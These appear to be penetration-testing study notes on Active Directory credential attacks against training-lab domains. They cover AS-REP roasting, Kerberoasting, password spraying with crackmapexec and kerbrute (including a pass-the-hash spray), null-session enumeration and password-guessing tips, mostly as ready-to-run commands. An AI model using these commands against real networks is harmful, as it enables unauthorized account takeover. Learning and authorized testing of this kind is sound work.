### AsReproasting
__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.
Asreproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 
- Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
- KDC responds with the `PRINCIPAL UNKNOWN` error for invalid usernames.
- Whenever the KDC prompts for Kerberos Pre-Authentication, this means username exists.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
```

```bash
kerbrute userenum --dc-ip $IP -d domain.local users.txt --downgrade
```

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
```

---
### Kerberoasting
Domain-connected services, such as MSSQL, web servers may be connected and issued identifiers that allow Kerberos to authenticate the service account. 
- If a domain user account is compromised, then that account can request kerberoastable account names and their _TGS_
- A Kerberoastable account is one that has an SPN set.
- In order to request SPNs, a domain account is needed to make the query.

```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
```

```bash
hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
```

---
### Password Spraying
|Tool|Ports|
|-|-|
|nmblookup|137/UDP|
|nbtstat|137/UDP|
|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
|rpcclient|135/TCP|
|smbclient|445/TCP|

#### Enum Password Policy
##### Using  Linux
- rpcclient
- CrackMapExec
- enum4linux-ng

__CrackMapExec__
```bash
crackmapexec smb $IP --pass-pol
```
```bash
crackmapexec smb $IP -u avazquez -p Password123 --pass-pol
```

__SMB NULL Session__
```shell-session
rpcclient -U "" -N $IP
rpcclient $> getdompwinfo
```

__LDAP Anonymous Bind__
```bash
ldapsearch -h $IP -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```


##### Using Windows
__NULL Session__
```cmd
net use \\DC01\ipc$ "" /u:""
```

__Credentialed__
```cmd
net accounts
```

#### Spray
__rpcclient__
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```

__Kerbrute__
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
```

__CrackMapExec__
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

__Local Admin Spraying__
- `--local-auth` flag will tell the tool only to attempt to _log in one time_ on each machine
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```



---
### BloodHound/SharpHound
![[Pasted image 20231207124143.png]]

##### Hide Output
- It generates different `.json` files, then saves them in a `zip` file. It also generates a randomly named file with a `.bin` extension corresponding to the cache of the queries it performs. Defense teams could use these patterns to detect bloodhound.

![[Pasted image 20231207124610.png]]

##### GUI Options
![[Pasted image 20231207131332.png]]

##### Search Bar options
- Group `Group:Domain Admins`
- Domain
- Computer
- User `User:john.doe`
- OU
- GPO
- Container

__Azure search bar options__
- AZApp
- AZRole
- AZDevice
- AZGroup
- AZKeyVault
- AZManagementGroup
- AZResourceGroup
- AZServicePrincipal
- AZSubscription
- AZTenant
- AZUser
- AZVM

---
### Create Password Lists

__Get Only passwords of length__
```bash
 cat new.pass| awk 'length($0) > 7 && length($0) < 13' | tee passwords.txt
```

#### Password Set Times
- Target Old passwords
- In most organizations, administrators have multiple accounts. If you see the administrator changing his "user account" around the same time as his "Administrator Account", they are highly likely to use the same password for both accounts. 
- If several passwords are at once then _maybe password is the same across those accounts_. For one user, guess passwords like "Password2020", for a different user, try company name "Freight2020!".
- Avoid passwords that wouldn't make sense, such as "Winter2019." when password was set in July of 2019.
- If you see a _several passwords set at the same time_, this indicates they were set by the Help Desk and may be the same. 

```powershell
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset
```
__Certain Date__
```powershell
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }
```

